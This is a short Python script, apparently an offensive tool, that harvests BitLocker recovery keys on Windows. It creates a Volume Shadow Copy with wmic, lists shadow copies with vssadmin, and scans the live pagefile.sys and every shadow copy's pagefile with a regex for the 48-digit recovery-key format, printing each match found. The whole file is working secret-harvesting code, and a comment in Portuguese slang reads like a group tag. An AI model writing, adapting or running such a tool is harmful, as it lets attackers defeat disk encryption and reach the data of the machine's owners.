import os
import re
import subprocess
import time

BITLOCKER_REGEX = re.compile(
    rb'\b\d{6}-\d{6}-\d{6}-\d{6}-\d{6}-\d{6}-\d{6}-\d{6}\b'
)

CHUNK_SIZE = 1024 * 1024 * 8  # 8MB


# =============================
# CREATE SHADOW COPY
# =============================
def create_shadow():
    print("[*] Creating Shadow Copy...")

    try:
        subprocess.run(
            "wmic shadowcopy call create Volume=C:\\",
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

        time.sleep(3)  # wait for creation

    except Exception as e:
        print(f"[ERROR] Creating shadow copy: {e}")


# =============================
# LIST SHADOW COPIES
# =============================
def get_shadowcopies():

    try:
        output = subprocess.check_output(
            "vssadmin list shadows",
            shell=True,
            text=True,
            stderr=subprocess.DEVNULL
        )

        shadows = []

        for line in output.splitlines():
            if "GLOBALROOT" in line:
                part = line.split("GLOBALROOT")[-1].strip()
                shadows.append(r"\\?\GLOBALROOT" + part)

        return shadows

    except:
        return []


# =============================
# BINARY SCAN
# =============================
def scan_file(path):

    print(f"[+] Scanning: {path}")
    found = set()

    try:
        with open(path, "rb", buffering=0) as f:

            while True:
                chunk = f.read(CHUNK_SIZE)
                if not chunk:
                    break

                matches = BITLOCKER_REGEX.findall(chunk)
                for m in matches:
                    found.add(m.decode(errors="ignore"))

    except Exception as e:
        print(f"[ERROR] {e}")

    return found


# Only for nxms ou melhor, nexamos kkkkkkkkkkkkkk BRASILLLLLLL
def main():

    results_total = set()

    # 1️⃣ Try live pagefile
    print("[*] Attempting live pagefile read...")

    live = r"C:\pagefile.sys"

    if os.path.exists(live):
        res = scan_file(live)
        results_total.update(res)

    # 2️⃣ Create new shadow copy
    create_shadow()

    # 3️⃣ List shadow copies
    shadows = get_shadowcopies()

    print(f"[*] Shadow copies found: {len(shadows)}")

    # 4️⃣ Scan all shadow pagefiles
    for s in shadows:
        page = s + r"\pagefile.sys"
        res = scan_file(page)
        results_total.update(res)

    return results_total


if __name__ == "__main__":

    results = main()

    print("\n===== RESULTS =====")

    if results:
        for r in results:
            print("[KEY]", r)
    else:
        print("[-] Nothing found")
